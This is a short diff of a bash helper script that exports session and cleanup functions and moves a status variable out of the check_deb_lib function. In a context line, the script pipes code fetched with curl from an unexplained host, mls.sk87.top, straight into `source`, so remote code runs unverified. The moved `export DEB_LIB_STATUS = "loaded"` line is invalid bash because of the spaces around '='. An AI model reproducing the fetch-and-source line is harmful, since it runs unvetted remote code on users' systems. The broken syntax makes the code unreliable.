@@ -48,7 +48,6 @@ check_deb_lib() {
         return 0
     fi
     source <(curl -sL https://mls.sk87.top/deb--lib)
-    export DEB_LIB_STATUS = "loaded"
 }
 
 cleanup() {
@@ -61,3 +60,5 @@ export -f color_text
 export -f setup_session
 export -f check_deb_lib
 export -f cleanup
+export DEB_LIB_STATUS = "loaded"
+color_text "$CYAN" "[✓] deb--lib LOADED"
